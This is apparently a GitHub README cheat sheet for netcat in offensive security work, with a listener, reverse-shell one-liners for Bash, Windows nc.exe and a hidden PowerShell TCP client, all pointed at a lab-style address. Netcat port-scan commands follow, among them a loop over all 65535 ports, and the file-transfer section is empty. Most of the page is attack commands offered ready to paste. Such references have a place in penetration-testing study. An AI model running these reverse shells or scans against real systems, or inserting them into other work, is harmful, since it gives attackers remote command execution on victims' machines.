<h1 align="center">Netcat Cheat Sheet</h1>

<p align="center">
  Fast reference guide for enumeration, scanning and offensive security workflows.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Linux-111827?style=for-the-badge&logo=linux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Netcat-Recon-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Pentesting-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>


## Reverse shell Bash

> The listener
````markdown
nc -lvnp 4444
````
````markdown
nc -lvnp 4444 -e /bin/bash
````


> The victima
````markdown
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
````
````markdown
nc.exe 10.10.14.5 4444 -e cmd.exe
````
````markdown
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)
````

## Port discovery
````markdown
nc -zv 10.10.10.5 80
````
>Scan range
````markdown
nc -zv 10.10.10.5 1-1000
````
> Scan UDP
````markdown
nc -zvu 10.10.10.5 53
````
> Scan silent
````markdown
nc -znv 10.10.10.5 53
````

> Script silent 
````markdown
for port in {1..65535}; do
    nc -znv 10.10.10.5 $port 2>&1 | grep succeeded
done
````

## File transfer





